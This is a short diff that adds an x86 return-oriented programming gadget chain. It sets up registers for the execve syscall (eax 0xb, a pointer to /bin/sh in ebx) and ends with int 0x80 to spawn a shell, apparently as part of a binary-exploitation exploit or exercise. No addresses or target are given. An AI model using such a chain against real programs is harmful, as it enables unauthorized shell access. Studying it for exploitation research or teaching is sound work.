@@ -1,0 +1,7 @@
+xor edx, edx; pop ebp; ret;
+xor ecx, ecx; pop ebp; ret;
+mov eax, 0xb; pop ebp; ret;
+pop ebx; ret;
+// pointer to /bin/sh
+int 0x80; pop ebp; ret;
+
